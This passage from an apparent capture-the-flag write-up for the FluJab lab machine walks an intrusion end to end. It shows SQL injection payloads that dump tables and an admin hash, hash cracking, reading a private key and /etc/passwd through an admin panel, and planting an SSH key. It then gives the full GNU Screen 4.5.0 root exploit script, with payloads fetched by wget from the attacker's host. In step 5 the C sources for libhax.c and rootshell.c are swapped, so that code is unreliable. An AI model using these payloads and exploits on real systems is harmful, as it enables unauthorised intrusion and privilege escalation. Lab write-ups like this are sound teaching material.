           ' AND '1'='1' UNION SELECT 1,2,system_user(),4,5 #
           ```
           ```
           ...
           Subject: Flu Jab Appointment - Ref:root@localhost
           ...
           ```  
           ```sql 
           ' AND '1'='1' UNION SELECT 1,2,database(),4,5 #
           ```
           ```
           ...
           Subject: Flu Jab Appointment - Ref:vaccinations
           ...
           ```
           __NOTE(S)__:
           - `MariaDB` is just the same as __MySQL__
           - The user hosting the `MariaDB` service is `root`
             - Using high privilege commands should not be a problem
           - The current database used by the service is `vaccinations`

        5. Retrieve relevant information from the database:
           ```sql 
           ' AND '1'='2' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database(); #    
           ```
           ```
           ...
           Subject: Flu Jab Appointment - Ref:admin,admin_attribute,admin_password_request,adminattribute,admintoken,attachment,attribute,bounce,bounceregex,bounceregex_bounce,config,eventlog,i18n,linktrack,linktrack_forward,linktrack_ml,linktrack_uml_click,linktrack_userclick,list,listmessage,listuser,message,message_attachment,messagedata,sendprocess,subscribepage,subscribepage_data,template,templateimage,urlcache,user,user_attribute,user_blacklist,user_blacklist_data,user_history,user_message_bounce,user_message_forward,user_message_view,usermessage,userstats
           ...
           ```
           ```sql 
           ' AND '1'='2' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_schema=database() AND table_name='admin'; #    
           ```
           ```
           ...
           Subject: Flu Jab Appointment - Ref:id,loginname,namelc,email,access,created,modified,modifiedby,password,passwordchanged,superuser,disabled,privileges
           ...
           ```
           ```sql 
           ' AND '1'='2' UNION SELECT 1,2,group_concat(<column_name>),4,5 FROM admin; #
           ```
           - `admin` table:
              id | loginname | namelc | email | access | created | modified | modifiedby | password | passwordchanged | superuser | disabled | privileges
              ---|---|---|---|---|---|---|---|---|---|---|---|---
              1 | sysadm | administrator | syadmin@flujab.htb | sysadmin-console-01.flujab.htb | 2018-07-02 08:45:19 | 2018-12-02 00:01:02 |  | a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602 |  2018-07-02 | 1 | 0 |
           __NOTE(S)__:
           - A new subdomain presents itself (`sysadmin-console-01.flujab.htb`)
           - The `password` is encrypted using __SHA-256__:
             ```console
             hashcat --force -m1400 a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602 /usr/share/wordlists/rockyou.txt 
             ```
             ```
             a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:th3doct0r
             ```
           - The password for `sysadm` is `th3doct0r`

---

## PART 3 : Generate User Shell

1. Add `sysadmin-console-01.flujab.htb` to local __/etc/hosts__:
   ```
   127.0.0.1       localhost
   127.0.1.1       kali f
   ...
   10.10.10.124    sysadmin-console-01.flujab.htb

   # The following lines are desirable for IPv6 capable hosts
   ::1     localhost ip6-localhost ip6-loopback
   ff02::1 ip6-allnodes
   ff02::2 ip6-allrouters
   ```  
   

2. Accessing https://sysadmin-console-01.flujab.htb:
   - Landing Page: 
     
     ![Direct IP Address not allowed](./screenshots/)

   __NOTE(S)__:
   - What if the page is requested over __*port 8080*__

3. Accessing https://sysadmin-console-01.flujab.htb:8080:
   - Landing Page: https://clownware.htb/cwerror_denied.php
     
     ![cwerror_denied](./screenshots/8080_sysadmin_console_01_cwerror.gif)

   - Requesting over `curl`
     ```console
     curl -I -k https://sysadmin-console-01.flujab.htb:8080
     ```
     ```
     HTTP/1.1 301 Moved Permanently
     Date: ..., .. May 2019 ..:..:.. GMT
     Content-Type: text/html
     Content-Length: 178
     Connection: keep-alive
     Location: https://clownware.htb/cwerror_denied.php
     Server: ClownWare Proxy
     ```
   __NOTE(S)__:
   - The page has a __Permanent Redirect__(__*301*__) to `.../cwerror_denied.php`    
   - The subdomain may be suffering from a __*cached redirect*__:
   - Cached redirects could be bypassed by:
     - Adding a __*trailing slash*__ (/)
     - Adding a __*unique*__ parameter that hasn't been cached:
       - __/?__, __/?something_unique__, or __/?unique=something__
   - There was a `urlcache` table in the `vaccinations` database

4. Check the `urlcache` table in `vaccinations` using `nhsnum` in __*/?remind*__
   - SQL Injection payload:
     ```sql
     ' AND '1'='2' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_schema=database() AND table_name='urlcache'; #
     ```
   - SMTP Server:
     ```smtp
     Subject: Flu Jab Appointment - Ref:id,url,lastmodified,added,content
     ```
   - SQL Injection payload:
     ```sql
     ' AND '1'='2' UNION SELECT 1,2,group_concat(url),4,5 FROM urlcache; #
     ```
   - SMTP Server:
     ```smtp
     Subject: Flu Jab Appointment - Ref:
     ```
   __NOTE(S)__:
   - There doesn't seem to be anything cached on the server
   - Clear browser cache (`Ctrl + Shift + Del` for FireFox)

5. Revisit https://sysadmin-console-01.flujab.htb:8080/?
   - Landing Page: /view/login/normal
   
     ![Ajenti](./screenshots/8080_sysadmin_console_01_ajenti.png)

   __NOTE(S)__:
   - The redirect no longer goes to __.../cwerror/denied.php__
   - It now redirects to an __Ajenti__ login page

6. Login using `sysadm:th3doct0r`
   - Ajenti Dashboard:
     
     ![Ajenti Dashboard](./screenshots/8080_sysadmin_console_01_dashboard.png) 

7. Read files using Ajenti's Notepad feature:
   - __/view/notepad//etc/passwd__:
     ```
     root:x:0:0:root:/root:/bin/bash
     ...
     drno:x:1000:1000:drno,,,:/home/drno:/bin/rbash
     ...
     nursejackie:x:1002:1006:,,,:/home/nursejackie:/bin/rbash
     sysadm:x:1003:1007:,,,:/home/sysadm:/bin/rbash
     drblack:x:1004:1008:,,,:/home/drblack:/bin/rbash
     drwhite:x:1005:1009:,,,:/home/drwhite:/bin/rbash
     drstrange:x:1006:1010:,,,:/home/drstrange:/bin/rbash
     drfoster:x:1007:1011:,,,:/home/drfoster:/bin/rbash
     dryi:x:1008:1012:,,,:/home/dryi:/bin/rbash
     drpo:x:1009:1013:,,,:/home/drpo:/bin/rbash
     drsmith:x:1010:1014:,,,:/home/drsmith:/bin/rbash
     drjones:x:1011:1015:,,,:/home/drjones:/bin/rbash
     drgreene:x:1012:1016:,,,:/home/drgreene:/bin/rbash
     drshipman:x:1013:1017:,,,:/home/drshipman:/bin/rbash
     drwho:x:1014:1018:,,,:/home/drwho:/bin/rbash
     nursepeter:x:1015:1019:,,,:/home/nursepeter:/bin/rbash
     nurseyi:x:1016:1020:,,,:/home/nurseyi:/bin/rbash
     nursemoe:x:1017:1021:,,,:/home/nursemoe:/bin/rbash
     drcrick:x:1018:1022:,,,:/home/drcrick:/bin/rbash
     drstones:x:1019:1023:,,,:/home/drstones:/bin/rbash
     nursewhitstone:x:1020:1024:,,,:/home/nursewhitstone:/bin/rbash
     nursetumble:x:1021:1025:,,,:/home/nursetumble:/bin/rbash
     nursewaters:x:1022:1026:,,,:/home/nursewaters:/bin/rbash
     nursewalters:x:1023:1027:,,,:/home/nursewalters:/bin/rbash
     nursebluecoats:x:1024:1028:,,,:/home/nursebluecoats:/bin/rbash
     drme:x:1025:1029:,,,:/home/drme:/bin/rbash
     drnu:x:1026:1030:,,,:/home/drnu:/bin/rbash
     drre:x:1027:1031:,,,:/home/drre:/bin/rbash
     drdre:x:1028:1032:,,,:/home/drdre:/bin/rbash
     ```
     __NOTE(S)__:
     - All users have a restricted shell `/bin/rbash`
     - The user, `drno`, has an `~/.ssh` directory
     - THere is a mismatch of `uid`s and `gid`s

   - __/view/notepad//home/drno/.ssh/userkey__:
     ```
     -----BEGIN RSA PRIVATE KEY-----
     Proc-Type: 4,ENCRYPTED
     DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B
     
     zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
     w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
     wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
     v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
     OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
     gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
     thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
     jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
     RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
     jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
     S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
     nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
     M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
     0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
     4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
     GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
     hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
     i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
     hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
     q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
     h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
     BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
     9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
     LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
     ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
     -----END RSA PRIVATE KEY-----
     ```
     __NOTE(S)__:
     - Export `userkey` file to local machine
     - Change `userkey`'s permissions -- `chmod 400 userkey`

8. Connect to 10.10.10.124 via `ssh`:
   ```console
   ssh -i userkey -l drno 10.10.10.124
   ```
   ```
   ssh_exchange_identification: Connection closed by remote host
   ```
   __NOTE(S)__:
   - The connection should work but it doesn't

   1. Go back to Ajenti's Notepad:
      - __/view/notepad//etc/ssh/sshd_config__
        ```console
        # $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $ 
      
        ...

        # Expect .ssh/authorized_keys2 to be disregarded by default in future.
        AuthorizedKeysFile .ssh/authorized_keys access

        ...
        ```
        __NOTE(S)__:
        - Public keys are read from `.ssh/authorized_keys` and/or `access`

      - __/view/notepad//home/drno/.ssh/authorized_keys__:
        ```
        # shell whitelisting + key auth enabled 
        ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
        ```
        __NOTE(S)__:
        - Remote connections must be __whitelisted__
        - The public key requires a __passphrase__
   
   2. Edit `hosts.allow` file using Ajenti's Notepad:
      - __/view/notepad//etc/hosts.allow__:
        ```
        # grant ssh access per host
        # syntax:
        # sshd : [host ip]
        ###########################

        sshd : 10.10.15.10
        sshd : l27.0.0.1
        ```
   3. Retry the connection via `ssh`:
      ```console
      ssh -i userkey -l drno 10.10.10.124
      ```
      ```
      Enter passphrase for key '/tmp/test': 
      drno@10.10.10.124: Permission denied (publickey).
      ```
      __NOTE(S)__:
      - No credentials for `drno` has been found so far
   
   4. Attempt creating an __ssh key__ and upload to a writable user:
      1. Create a key using `ssh-keygen`:
         ```console
         ssh-keygen -t rsa -b 4096
         ```
         ```
         Generating public/private rsa key pair.
         Enter file in which to save the key (/home/.../.ssh/id_rsa): .ssh/id_rsa
         Enter passphrase (empty for no passphrase): flujab
         Enter same passphrase again: flujab
         Your identification has been saved in .ssh/id_rsa.
         Your public key has been saved in .ssh/id_rsa.pub.
         The key fingerprint is:
         SHA256:xHmVZlXhLq8Gp0FvcWd9IFKymV97HHM6BP3K3RxkEVw jebidiah@LAPTOP-C54THGLR
         The key's randomart image is:
         +---[RSA 4096]----+
         |          ..++o=E|
         |       . ..*=.++ |
         |        + =+ .=*o|
         |       . . o +.*X|
         |        S . oo**B|
         |           o +=o+|
         |            *  . |
         |           . ..  |
         |            ..   |
         +----[SHA256]-----+
         ```
      2. Upload `id_rsa.pub` to a writable user directory:
         1. Write a file using the Ajenti API:
            ```http
            POST /api/filesystem/write//home/sysadm/access?encoding=utf-8 HTTP/1.1
            Host: sysadmin-console-01.flujab.htb:8080
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
            Accept: application/json, text/plain, */*
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate
            Referer: https://sysadmin-console-01.flujab.htb:8080/view/notepad//home/sysadm/access
            Content-Type: application/json;charset=utf-8
            Content-Length: 724
            Connection: close
            Cookie: ...

            ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCiZ+jqG9aLGvumbTF4wGsff1tooQuWOFvqSqna7O0hSdDIB43mwIy1yYGvhH75T9h4XkFc1PeWdflT14ox4M1imLIk8DMFHZLac9e/nEs+cJzmk+BDVG5AckG3DnSaa0f3ftfSsRVqCnD3SXdhYH+KKO2WaQRt4Nsv6BGcomnJm/b1vr/zn2fkwEiC0fI2cENvZ3HaEvVrVnDESc4TKPiPiZSZ8TnfMi++nDwVbZOroOoo1InrL3jSDYuuZR0Qn7TGMoh+anLBxdCRgQuPqav1br0g0OrTvr39IsfsCPNVSrknISPnzPvekaYJkoihdTwezbaCo63/wBhTk25nW+y57b3FRaCyUbBCw5+Qrshc5HNxYhfy1pujFkfVDfuKgZhUFIGJKqkFjX+DTJqulZL8LtyoWrhGVIBkYmblAIchc8ZXwzDnHPyezqTmrYTuSNipuFCYcVQ8iYXprIAXlNHFh4e0+mgnJ/J0QS5mvVQaDlRrZnB1s9/6VDSUH7W8X+ZbC4lKM816VHnBJDW/IZw+LK4jf4tndx2GZCsa8aI6u9WvUAfc5gHkrx5EZT2ewIbjNKdIeFOEY/2kCFypGGBB5758wgfS7MDbFtI1hgZ8+fGac3Bt2MEWKM2vO9IgBH8vaTbLvxIOs3gnTR3i/EPKh8IG8/VOwGneT4kNJQN+hQ==
            ```
            __NOTE(S)__:
            - The user, `sysadm`, has a writable home directory
            - The file saved is named `access` (referring to `sshd_config`)
         
         2. Change the file permissions of the uploaded public key:
            ```http
            POST /api/filesystem/chmod//home/sysadm/access?encoding=utf-8 HTTP/1.1
            Host: sysadmin-console-01.flujab.htb:8080
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
            Accept: application/json, text/plain, */*
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate
            Referer: https://sysadmin-console-01.flujab.htb:8080/view/notepad//home/sysadm/access
            Content-Type: application/json;charset=utf-8
            Content-Length: 12
            Connection: close
            Cookie: ...

            {"mode":292}
            ```
            __NOTE(S)__:
            - According to the [`ajenti.filesystem` documentation](http://docs.ajenti.org/en/latest/refjs/filesystem.html),
              - `chmod` accepts 2 arguments -- `(path, mode)`:
              - `mode` accepts an integer value
            - `chmod` uses __octal values__ for user, group, global, and other permissions
              - The __octal value__ for `-r--r--r--` is __0444__
              - In decimal (or integer value), __0444__ is __292__

9. Reconnect to 10.10.10.124 via `ssh`:
   ```console
   chmod 400 .ssh/id_rsa

   ssh -i .ssh/id_rsa -l sysadm 10.10.10.124
   ```
   ```
   Enter passphrase for key '.ssh/id_rsa': flujab
   ```
   - While inside `sysadm` shell:
     ```console
     cd
     # -rbash: cd: restricted
     ```
   - Escape the `rbash`:
     1. Test commands that you can use:
        ```console
        python --version
        # Python 2.7.13
        ```
        __NOTE(S)__:
        - The shell accepts `python` instructions
     
     2. Leverage `python`:
        ```console
        python -c 'import pty; pty.spawn("/bin/bash")'
        ```

---

## PART 4 : Attempt Privilege Escalation (sysadm -> root)

1. Check for __SUID files__ owned by `root`:
   ```console
   find / -uid 0 -perm -4000 -type f 2>/dev/null
   # ...
   # /usr/local/share/screen/screen
   # ...
   # /usr/bin/screen
   # ...
   ```
   __NOTE(S)__:
   - There are two binaries with the same name (`screen`)
   - `screen` can write files to the system using its `-L` option
     - __*logfiles*__ will be written as __root__

2. Check the binary version:
   ```console
   /usr/local/share/screen/screen -v
   # Screen version 4.05.00 (GNU) 10-Dec-16

   /usr/bin/screen -v
   # Screen version 4.05.00 (GNU) 10-Dec-16

   echo $PATH
   # /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
   ```
   __NOTE(S)__:
   - Both are running `version 4.05.00`
   - `/usr/local/share` is not in the `PATH` variable
   - `/usr/local/share` is a hidden binary with an SUID bit

3. Search for available exploits:
   ```console
   searchsploit screen | grep 4.5
   # GNU Screen 4.5.0 - Local Privilege Escalation            | exploits/linux/local/41154.sh
   # GNU Screen 4.5.0 - Local Privilege Escalation (PoC)      | exploits/linux/local/41152.txt

   searchsploit -m exploits/linux/local/41154.sh
   #   Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
   #       URL: https://www.exploit-db.com/exploits/41154
   #      Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
   # File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
   ```
   - __41154.sh__:
     ```sh
     #!/bin/bash
     # screenroot.sh
     # setuid screen v4.5.0 local root exploit
     # abuses ld.so.preload overwriting to get root.
     # bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
     # HACK THE PLANET
     # ~ infodox (25/1/2017) 
     echo "~ gnu/screenroot ~"
     echo "[+] First, we create our shell and library..."
     cat << EOF > /tmp/libhax.c
     #include <stdio.h>
     #include <sys/types.h>
     #include <unistd.h>
     __attribute__ ((__constructor__))
     void dropshell(void){
         chown("/tmp/rootshell", 0, 0);
         chmod("/tmp/rootshell", 04755);
         unlink("/etc/ld.so.preload");
         printf("[+] done!\n");
     }
     EOF
     gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
     rm -f /tmp/libhax.c
     cat << EOF > /tmp/rootshell.c
     #include <stdio.h>
     int main(void){
         setuid(0);
         setgid(0);
         seteuid(0);
         setegid(0);
         execvp("/bin/sh", NULL, NULL);
     }
     EOF
     gcc -o /tmp/rootshell /tmp/rootshell.c
     rm -f /tmp/rootshell.c
     echo "[+] Now we create our /etc/ld.so.preload file..."
     cd /etc
     umask 000 # because
     screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
     echo "[+] Triggering..."
     screen -ls # screen itself is setuid, so... 
     /tmp/rootshell
     ```
     __NOTE(S)__
     - `screen` is used to write to the `/etc` directory as __root__
     - The exploit creates two files -- `libhax.c` and `rootshell.c`
     - `libhax.c` is compiled as a __*shared object*__ file (`libhax.so`)
       - `libhax.so` gives __SUID root__ permissions to `/tmp/rootshell`
       - `libhax.so` is wriiten to `/etc/ld.so.preload`
       - __*shared objects*__ in `/etc/ld.so.preload` are loaded before everything else
     - `rootshell.c` is compiled as an executable (`rootshell`)

4. Enumerate the system using `sysadm` shell:
   ```console
   uname -a
   # Linux flujab 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux

   gcc
   # bash: gcc: command not found
   ```
   __NOTE(S)__:
   - The system runs on a 64-bit architecture
   - `gcc` is not available in the system

5. Create and compile `libhax.c` and `rootshell.c` locally:
   1. Create `libhax.c`:
      ```console
      vim libhax.c
      ```
      ```c
      #include <stdio.h>
      int main(void){
          setuid(0);
          setgid(0);
          seteuid(0);
          setegid(0);
          execvp("/bin/sh", NULL, NULL);
      }
      ```
      ```
      :wq
      ```
   2. Create `rootshell.c`:
      ```console
      vim rootshell.c
      ```
      ```c
      #include <stdio.h>
      #include <sys/types.h>
      #include <unistd.h>
      __attribute__ ((__constructor__))
      void dropshell(void){
          chown("/tmp/rootshell", 0, 0);
          chmod("/tmp/rootshell", 04755);
          unlink("/etc/ld.so.preload");
          printf("[+] done!\n");
      }
      ```
      ```
      :wq
      ```
   3. Compile the binaries:
      ```console
      gcc -fPIC -shared -ldl -o libhax.so libhax.c
      # libhax.c: In function ‘dropshell’:
      # libhax.c:7:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
      #      chmod("/tmp/rootshell", 04755);
      #      ^~~~~
      #      chroot

      gcc -o rootshell rootshell.c
      # rootshell.c: In function ‘main’:
      # rootshell.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
      #      setuid(0);
      #      ^~~~~~
      #      setbuf
      # rootshell.c:4:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
      #      setgid(0);
      #      ^~~~~~
      #      setbuf
      # rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’; did you mean ‘setbuf’? [-Wimplicit-function-declaration]
      #      seteuid(0);
      #      ^~~~~~~
      #      setbuf
      # rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
      #      setegid(0);
      #      ^~~~~~~
      # rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
      #      execvp("/bin/sh", NULL, NULL);
      #      ^~~~~~
      ```
6. Upload the binaries to the `sysadm` shell:
   - Local terminal:
     ```console
     python -m SimpleHTTPServer
     ```
   - `sysadm` shell:
     ```
     cd /tmp

     wget http://10.10.15.10:8000/libhax.so
     # libhax.so           100%[===================>]  15.76K  62.6KB/s    in 0.3s

     wget http://10.10.15.10:8000/rootshell
     # rootshell           100%[===================>]  16.43K  52.1KB/s    in 0.3s    
     ```

7. Execute the exploit:
   - `sysadm` shell:
     ```console
     chmod +x /tmp/rootshell

     cd /etc

     umask 000

     /usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

     /usr/local/share/screen/screen -ls
     # No Sockets found in /tmp/screens/S-sysadm.

     /tmp/rootshell
     ```
   - While inside `root` shell:
     ```console
     id
     # uid=0(root) gid=0(root) groups=0(root),1007(sysadm)

     cat /root/root.txt
     # 7081748f80e8ec0c02ddbf0c96daee33
     
     find /home -name user.txt
     # /home/drno/user.txt
     # /home/drme/user.txt
     # /home/nursemoe/user.txt
     # /home/drshipman/user.txt
     # /home/drstrange/user.txt
     # /home/drsmith/user.txt
     # /home/nursewhitstone/user.txt
     # /home/nursewalters/user.txt
     # /home/drgreene/user.txt
     # /home/drstones/user.txt
     # /home/drre/user.txt
     # /home/drwho/user.txt
     # /home/nurseyi/user.txt
     # /home/drjones/user.txt
     # /home/nursejackie/user.txt
     # /home/nursewaters/user.txt
     # /home/nursebluecoats/user.txt
     # /home/drblack/user.txt
     # /home/nursepeter/user.txt
     # /home/drpo/user.txt
     # /home/drwhite/user.txt
     # /home/drcrick/user.txt
     # /home/nursetumble/user.txt
     # /home/dryi/user.txt
     # /home/drnu/user.txt
     # /home/drdre/user.txt
     # /home/drfoster/user.txt
     
     cat /home/*/user.txt
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # c519aa2fa8c2b69eb3891d8d46c662d4
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P           
     # This is A Nope !!! :P
     ```